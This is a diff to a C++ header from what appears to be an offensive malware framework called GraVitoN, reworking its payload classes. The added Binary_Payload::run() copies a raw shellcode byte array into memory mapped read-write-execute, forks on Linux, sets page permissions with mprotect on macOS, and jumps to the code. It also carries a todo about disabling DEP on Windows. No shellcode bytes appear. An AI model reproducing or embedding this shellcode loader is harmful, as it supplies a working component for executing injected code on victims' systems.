@@ -28,6 +28,18 @@
 #define _GVN_PAYLOAD_HEAD_
 
 #include "../graviton.hpp"
+
+#if defined(INFO_OS_LINUX)
+    #include <sys/mman.h>
+    #include <sys/types.h>
+    #include <sys/wait.h>
+    #include <errno.h>
+    #include <unistd.h>
+#elif defined(INFO_OS_OSX)
+    #include <sys/mman.h>
+    #include <errno.h>
+#endif
+
 #include <string>
 #include <cstring>
 using namespace std;
@@ -39,6 +51,8 @@ using namespace std;
 
 namespace GraVitoN
 {
+namespace Payload
+{
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
  * @brief Payload execution class
@@ -48,28 +62,28 @@ namespace GraVitoN
  * <b> I'm Drunk, and Sadjad (void), My Best Friend Is Dead (Suicide). =( [07/02/12] </b>
  * 
  */
-class Payload : public Component
+class Payload_Component : public Core::Component
 {
 public:
 	/// Constructor
-    Payload();
+    Payload_Component();
 
 	/// Destructor
-    virtual ~Payload();
+    virtual ~Payload_Component();
 
 	/**
-	 * @brief CALL your payload
+     * @brief CALL your payload
 	 *
-	 * After you initialized your payload, this is the exact time you should call 'call' method
+     * After you initialized your payload, this is the exact time you should call 'call' method
 	 *
 	 * @return
-	 * True if it's done successfully
+     * True if it's done successfully
 	 * 
 	 */
-    virtual bool run();
+    virtual bool run() = 0;
 };
 
-
+//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
  * @brief Binary payload class
  *
@@ -78,58 +92,42 @@ public:
  * @note To build binary payloads you need to disable optimization flag (-O0)
  *
  */
-
-class Bin_Payload : public Payload
+class Binary_Payload : public Payload_Component
 {
 protected:
-	/// Payload Hex Array
+    /// Payload Hex Array
     unsigned char *payload;
 
-	/// Size of your payload in bytes
+    /// Size of your payload in bytes
     int payload_size;
 
-	/// Start address of your payload
+    /// Start address of your payload
     void ( *jumper ) ( void * );
 
-	/**
-	 * @brief Initialize your payload's assembly code
-	 *
-	 * Apply your options (bind port) and set jumper memory
-	 *
-	 */
-    virtual bool initPayload();
-
 public:
-	Bin_Payload();
-	~Bin_Payload();
+    Binary_Payload();
+    ~Binary_Payload();
+
+    virtual bool run();
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload::Payload()
+Payload_Component::Payload_Component()
 {
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload::~Payload()
+Payload_Component::~Payload_Component()
 {
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload::run()
+Binary_Payload::Binary_Payload()
 {
-    return true;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Bin_Payload::Bin_Payload()
-{
-	options = "<no options>";
-	
-	jumper = _null_;
-}
-
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Bin_Payload::~Bin_Payload()
+Binary_Payload::~Binary_Payload()
 {
 	try
 	{
@@ -138,16 +136,115 @@ Bin_Payload::~Bin_Payload()
 	}
 	catch(...)
 	{
-		Logger::logItLn("Bin_Payload::~Bin_Payload Exception");
+        Core::Logger::logItLn("Bin_Payload::~Bin_Payload Exception");
 	}
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Bin_Payload::initPayload()
+/// @todo android and ios support
+bool Binary_Payload::run()
 {
-	Logger::logItLn("Init payload memory...");
+    /// Copy payload to heap
+#if defined(INFO_OS_LINUX)
+    /// Copy payload to heap and set RWX permisson
+    // jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
+    /// During my linux tests, I discoverd that mmap is better than mprotect
+    jumper = ( void ( * ) ( void* ) ) mmap( 0, payload_size,
+                                            PROT_READ | PROT_WRITE | PROT_EXEC,
+                                            MAP_SHARED | MAP_ANONYMOUS,
+                                            -1, 0 );
+
+    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+#else
+    /// Set jumper address
+    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
+    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+#endif
+
+#if defined(INFO_OS_LINUX)
+    /// Fork
+    Core::Logger::logItLn ("Forking...");
+    int pid = fork();
+
+    /// If i'm child process
+    if ( pid == 0 )
+    {
+#endif
+
+        /// Setting Heap RWX Permissions
+#if defined(INFO_OS_LINUX)
+        /// Noithing!
+        /// Permission was set by mmap()
+#elif defined(INFO_OS_OSX)
+        /// Set Page Permissions
+        unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
+        if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
+            Logger::logIt ( "mprotect failed - errorno: " );
+            Logger::logItLn ( errno );
+
+            return false;
+        }
+#elif defined(INFO_OS_WINDOWS)
+/// @todo: disable DEP @ runtime
+#endif
+        /// A Little OS Independent Delay!
+        int _delay = 320;
+        while ( _delay > 0 )
+        {
+            --_delay;
+        }
+
+        /// Jumping to starting address of payload
+
+#if defined(INFO_CPU_X64)
+        Core::Logger::logItLn ( "Jumping on Payload (64bit)..." );
+        jumper(_null_);
+
+        /*
+        int useless_out = 0;
+        asm (
+            "mov %1, %%rbx;"
+            "jmp *%%rbx;"
+            : "=r" ( useless_out )
+            : "r" ( jumper )
+            : "%rbx"
+        );
+        */
+#elif defined(INFO_CPU_X86)
+        Core::Logger::logItLn ( "Jumping on Payload (32bit)..." );
+        jumper(_null_);
+
+        /*
+        int useless_out = 0;
+        asm (
+            "mov %1, %%ebx;"
+            "jmp *%%ebx;"
+            : "=r" ( useless_out )
+            : "r" ( jumper )
+            : "%ebx"
+        );
+        */
+#else
+        Core::Logger::logItLn ( "Jumping on Payload (unk)..." );
+        jumper(_null_);
+#endif
+
+/// @todo ARM
+
+#if defined(INFO_OS_LINUX)
+        exit(0);
+    }
+
+    /// While Child is runnig
+    while( waitpid(pid, NULL, 0) > 0 )
+        sleep(0.01);
+#endif // INFO_OS_LINUX
+
+    Core::Logger::logItLn ( "call > done" );
+    return true;
 }
 
+}
 }
 
 #endif // _GVN_PAYLOAD_HEAD_
